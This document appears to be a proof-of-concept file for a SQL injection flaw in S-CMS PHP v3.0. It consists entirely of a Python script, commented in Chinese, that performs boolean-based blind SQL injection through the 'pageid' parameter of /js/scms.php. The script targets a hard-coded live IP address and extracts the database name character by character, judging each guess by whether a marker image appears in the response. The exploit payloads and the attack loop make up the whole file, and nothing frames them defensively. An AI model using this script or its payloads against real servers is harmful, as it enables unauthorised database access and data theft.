# S-CMS PHP v3.0存在SQL注入漏洞.md
import requests
import urllib.parse
import logging

# 配置日志记录，设置日志级别为INFO，并定义日志输出格式
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 定义用于测试数据库名的字符集
chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789'
# 目标URL，用于发送HTTP POST请求
url = 'http://106.14.144.32:2000/js/scms.php'
# 特殊图像的文件名，用于检查响应中是否包含目标数据
special_image = '20151019102732946.jpg'


def get_database_length():
    """
    爆破数据库长度函数。尝试通过修改payload的长度值来确定数据库的长度。
    如果响应中不包含特殊图像，则说明数据库长度大于当前尝试的长度。
    """
    logging.info('开始爆破数据库长度...')
    for i in range(10):  # 尝试长度从0到9
        # 构造测试payload
        payload = f"1%0Aand%0Aif(length(database())>{i},1,0)#"
        payload = urllib.parse.unquote(payload)  # 解码URL编码的payload
        data = {
            'action': 'jssdk',
            'pagetype': 'text',
            'pageid': payload
        }
        try:
            # 发送POST请求
            rs = requests.post(url=url, data=data)
            rs.raise_for_status()  # 检查请求是否成功
        except requests.RequestException as e:
            # 处理请求异常
            logging.error(f"请求失败: {e}")
            continue

        # 检查响应中是否包含特殊图像，以确认数据库长度
        if special_image not in rs.text:
            logging.info(f"数据库名的长度为：{i}")
            return i  # 返回确定的数据库长度
    return None  # 如果未找到长度，则返回None


def get_database_name():
    """
    获取数据库名函数。根据确定的数据库长度，通过逐字符猜测的方式获取数据库名。
    """
    logging.info('开始获取数据库名')
    databasename = ''  # 初始化数据库名
    length = get_database_length()  # 获取数据库长度

    if length is None:
        # 如果无法获取数据库长度，则返回None
        logging.error("无法获取数据库长度")
        return None

    for i in range(1, length + 1):  # 遍历数据库名的每一位
        for c in chars:  # 遍历可能的字符
            # 构造测试payload，检查当前字符是否为数据库名的当前位置的字符
            payload = f'1%0Aand%0Aif(ascii(substr(database(),{i},1))={ord(c)},1,0)#'
            payload = urllib.parse.unquote(payload)  # 解码URL编码的payload
            data = {
                'action': 'jssdk',
                'pagetype': 'text',
                'pageid': payload
            }
            try:
                # 发送POST请求
                rs = requests.post(url=url, data=data)
                rs.raise_for_status()  # 检查请求是否成功
            except requests.RequestException as e:
                # 处理请求异常
                logging.error(f"请求失败: {e}")
                continue

            # 检查响应中是否包含特殊图像，以确认当前字符
            if special_image in rs.text:
                databasename += c  # 将确定的字符添加到数据库名中
                logging.info(f"当前数据库名: {databasename}")
                break  # 退出字符循环，开始检查下一个字符的位置

    return databasename  # 返回最终获取的数据库名


def main():
    """
    主函数。调用获取数据库名的函数并记录结果。
    """
    db_name = get_database_name()  # 获取数据库名
    if db_name:
        # 如果成功获取数据库名，则记录日志
        logging.info(f"数据库名: {db_name}")
    else:
        # 如果无法获取数据库名，则记录错误日志
        logging.error("无法获取数据库名")


if __name__ == "__main__":
    # 如果脚本作为主程序运行，则调用main函数
    main()
